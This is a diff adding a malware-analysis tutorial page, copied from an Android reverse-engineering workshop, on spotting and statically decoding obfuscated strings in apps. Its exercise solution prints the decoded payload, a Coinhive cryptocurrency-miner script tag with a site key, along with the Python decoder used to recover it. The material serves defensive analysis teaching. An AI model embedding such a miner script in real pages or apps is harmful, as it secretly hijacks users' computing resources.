@@ -1,0 +1,93 @@
+# Manual DeObfuscation
+
+**Copied from** [**https://maddiestone.github.io/AndroidAppRE/obfuscation.html**](https://maddiestone.github.io/AndroidAppRE/obfuscation.html) **\(you can find solutions there\)**
+
+![Logo](https://maddiestone.github.io/AndroidAppRE/images/pinkandroid.png)
+
+There are many times when the application you’re reversing will not be as straight forward as some of the examples we’ve discussed. The developer will implement one or more obfuscation techniques to hide the behavior and/or implementation of their app. This can be for both benign and malicious reasons.
+
+The key about obfuscation to remember is that if you want to de-obfuscate it, you will be able to. The key decision is not whether or not you can, but whether or not it’s worth the resources to de-obfuscate.
+
+The reason that you can always de-obfuscate something is because ultimately the CPU at some point has to see the unobfuscated code in order to run it.
+
+### How to De-Obfuscate <a id="how-to-de-obfuscate"></a>
+
+How you choose to de-obfuscate the application will depend on the obfuscation method, but there are a couple of common techniques that usually work well. Here, we will only touch on the static de-obfuscation techniques since this workshop only covers static analysis/reversing. However, do remember that running the application and dynamically analyzing it can be another great way to get around obfuscation.
+
+For obfuscation in the DEX bytecode \(Java\), one of the easiest ways to statically deobfuscate is to identify the de-obfuscation methods in the application and copy their decompilation into a Java file that you then run on the obfuscated file, strings, code, etc.
+
+Another solution for both Java and Native Code is to transliterate the de-obfuscation algorithm into Python or any other scripting language that you’re most comfortable. I say “transliterate” because it’s important to remember that you don’t always need to \*understand\* the de-obfuscation algorithm, you just need a way to execute it. I cover this in more detail in the “Unpacking the Packed Unpacker” talk that is linked in the “More Examples” section.
+
+### Indicators of Obfuscation <a id="indicators-of-obfuscation"></a>
+
+There are many different types of obfuscation and thus, just as many different types of indicators to alert you as the analyst that an application is likely obfuscated, but here are a few examples with proposed static analysis solutions for deobfuscating.
+
+* No strings: Java and Android are highly dependent on strings so if you don’t see any or only scrambled strings, it’s highly likely the strings are obfuscated.
+  * Suggested solution: Look for method calls that take strings as an argument and trace back where that argument is coming from. At some point the string argument will be going through a deobfuscation method before it’s passed to the API that takes the String argument.
+* Scrambled strings: The Java and Android APIs require the plain text strings, not scrambled.
+  * Suggested solution: The scrambled strings are all likely passed to the same methods prior to being passed to the APIs. These methods are likely the deobfuscation methods.
+* Binary files in the assets/ directory and DexClassLoader calls in the app: Likely unpacking and loading additional code. \(Could also be downloading from a remote location and then loading using DexClassLoader\)
+  * Suggestion Solution: Identify where the file is read and then follow the path. It is likely deobfuscated quickly after being read.
+* Native libraries - Can’t identify the JNI functions \(no funcs named Java\_ and no calls to RegisterNatives\): In order to execute any native methods, JNI has to be able to pair the function in the native library with the native method declaration in Java and thus one of the two must exist at some point.
+  * Suggested Solution: Start at JNI\_OnLoad method and look for a de-obfuscation routine that loads additional code.
+
+### Exercise 7 - String Deobfuscation <a id="exercise-7---string-deobfuscation"></a>
+
+In this exercise, we will practice de-obfuscating strings in order to analyze an application. For the exercise we will use the sample at `~/samples/ClashOfLights.apk` in the VM. This sample has the SHA256 digest c403d2dcee37f80b6d51ebada18c409a9eae45416fe84cd0c1ea1d9897eae4e5.
+
+#### Goals <a id="goals"></a>
+
+To identify obfuscated strings and develop a solution to deobfuscate it.
+
+#### Exercise Context <a id="exercise-context"></a>
+
+You are a malware analyst reviewing this application to determine if it’s malware. You come across an obfuscated Javascript string that is being loaded and need to deobfuscate it to determine whether or not the application is malicious. You can’t run the application dynamically and need to determine what the Javascript is statically.
+
+#### Instructions <a id="instructions"></a>
+
+1. Find the string that you need to de-obfuscate
+2. Identify the routine that de-obfuscates it.
+3. Determine how you want to write a solution to de-obfuscate the string.
+4. Do it :\)
+
+#### Solution <a id="solution"></a>
+
+The deobfuscated string is:
+
+```text
+<script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner = new CoinHive.Anonymous('nf24ZwEMmu0m1X6MgcOv48AMsIYErpFE', {threads: 2});miner.start();</script>
+```
+
+The Python script I wrote to de-obfuscate it is:
+
+```text
+enc_str = "773032205849207A3831326F1351202E3B306B7D1E5A3B33252B382454173735266C3D3B53163735222D393B475C7A37222D7F38421B6A66643032205849206477303220584920643D2223725C503A3F39636C725F5C237A082C383C7950223F65023F3D5F4039353E3079755F5F666E1134141F5C4C64377A1B671F565A1B2C7F7B101F42700D1F39331717161574213F2B2337505D27606B712C7B0A543D342E317F214558262E636A6A6E1E4A37282233256C"
+
+length = len(enc_str)
+count = 0
+dec_str = [0] * (length/2)
+while (count < length):
+    dec_str[count/2] = (int(enc_str[count], 16) << 4) + int(enc_str[count + 1], 16) & 0xFF
+    count += 2
+print dec_str
+
+
+key = [75, 67, 81, 82, 49, 57, 84, 90]
+enc_str = dec_str
+count = 0
+length = len(enc_str)
+while (count < length):
+    dec_str[count] = chr(enc_str[count] ^ key[count % len(key)])
+    count += 1
+print ''.join(dec_str)
+```
+
+### More Examples <a id="more-examples"></a>
+
+I have done a few talks on de-obfuscating Android apps that include a variety of obfuscation mechanisms. In these talks, I discuss the advanced obfuscation techniques, my solution to de-obfuscate them, and the considerations and choices I made when deciding how I wanted to deobfuscate.
+
+* BlackHat USA 2018: “Unpacking the Packed Unpacker: Reverse Engineering an Android Anti-Analysis Library” \[[video](https://www.youtube.com/watch?v=s0Tqi7fuOSU)\]
+  * This talk goes over reverse engineering one of the most complex anti-analysis native libraries I’ve seen used by an Android application. It covers mostly obfuscation techniques in native code.
+* REcon 2019: “The Path to the Payload: Android Edition” \[[video](https://recon.cx/media-archive/2019/Session.005.Maddie_Stone.The_path_to_the_payload_Android_Edition-J3ZnNl2GYjEfa.mp4)\]
+  * This talk discusses a series of obfuscation techniques, solely in Java code, that an Android botnet was using to hide its behavior.
+
